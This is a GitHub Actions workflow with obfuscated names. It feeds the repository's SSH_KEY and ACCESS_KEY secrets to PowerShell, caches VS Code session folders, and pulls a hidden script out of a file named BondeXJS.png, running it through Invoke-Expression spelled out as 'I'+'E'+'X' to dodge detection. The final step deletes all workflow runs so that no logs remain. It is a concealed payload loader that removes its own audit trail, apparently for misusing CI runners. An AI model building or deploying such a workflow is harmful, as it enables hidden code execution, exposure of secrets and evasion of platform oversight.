name: r4dx

on:
  workflow_dispatch:

jobs:
  j_712:
    runs-on: windows-latest
    timeout-minutes: 360
    permissions:
      actions: write
      contents: read

    steps:
      - name: s_01
        uses: actions/checkout@v4
        
      - name: s_02
        uses: actions/cache@v4
        with:
          path: |
            ~\AppData\Roaming\Code
            ~\.vscode\extensions
            C:\Windows\Temp\app_sessions
          key: ${{ runner.os }}-ghost-session
          # Penting: Pakai restore-keys agar jika key utama tidak ada, dia ambil yang lama
          restore-keys: |
            ${{ runner.os }}-ghost-session

      - name: s_03
        shell: powershell
        env:
          SSH_KEY: ${{ secrets.SSH_KEY }}
          A_KEY: ${{ secrets.ACCESS_KEY }}
        run: |
          # (Isi script s_02 kamu tetap sama)
          $imgPath = Join-Path $pwd "BondeXJS.png"
          # ... sisanya sama ...

      - name: s_04
        shell: powershell
        env:
          SSH_KEY: ${{ secrets.SSH_KEY }}
          A_KEY: ${{ secrets.ACCESS_KEY }}
        run: |
          $imgPath = Join-Path $pwd "BondeXJS.png"
          
          if (Test-Path $imgPath) {
              Write-Host "[*] Reading payload from $imgPath..." -ForegroundColor Cyan
              
              $content = Get-Content $imgPath -Raw -Encoding utf8
              $marker = "# ========================================================="
              $startIndex = $content.IndexOf($marker)
              if ($startIndex -ge 0) {
                  $payload = $content.Substring($startIndex)
                  Write-Host "[+] Payload extracted. Launching Ghost Engine..." -ForegroundColor Green
                  $e = "I" + "E" + "X"
                  & $e ($payload)
              } else {
                  Write-Host "[-] Error: Marker skrip tidak ditemukan dalam gambar!" -ForegroundColor Red
                  exit 1
              }
          } else {
              Write-Host "[-] Error: File BondeXJS.png tidak ditemukan di root repo." -ForegroundColor Red
              exit 1
          }
          
      - name: s_05
        uses: Mattraks/delete-workflow-runs@v2
        if: always()
        with:
          token: ${{ github.token }}
          repository: ${{ github.repository }}
          retain_days: 0
          keep_minimum_runs: 0
